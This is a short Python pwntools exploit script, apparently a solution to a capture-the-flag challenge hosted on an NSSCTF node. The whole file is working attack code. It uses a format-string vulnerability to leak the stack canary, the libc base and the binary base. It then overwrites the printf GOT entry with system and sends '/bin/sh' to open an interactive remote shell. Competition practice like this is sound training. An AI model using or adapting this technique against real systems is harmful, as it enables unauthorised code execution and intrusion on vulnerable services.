from pwn import *

#io = process("./附件")
io = remote("node4.anna.nssctf.cn", 23103)
elf = ELF("./附件")
libc = ELF("./libc.so.6")

context.arch = "amd64"
context.os = "linux"

# offset 6
payload = b"%19$p%21$p^^%25$p&&" # canary, csu + 140, main
io.recvuntil(b"you want to say: ")
io.sendline(payload)
canary = int(io.recvuntil(b"00")[-16:], 16)
print("canary =", hex(canary))
libc_base = int(io.recvuntil(b"^^")[:-2], 16) - 240 - libc.sym["__libc_start_main"]
print("libc base address =", hex(libc_base))
main = int(io.recvuntil(b"&&")[:-2], 16)
elf_base = main - 0xa14
print("main =", hex(main))
system = libc_base + libc.sym["system"]
printf_got = elf_base + elf.got["printf"]


payload = fmtstr_payload(6, {printf_got:system}, write_size="short")
io.recvuntil(b"you want to say: ")
io.sendline(payload)
io.sendline(b"/bin/sh\x00")

io.interactive()
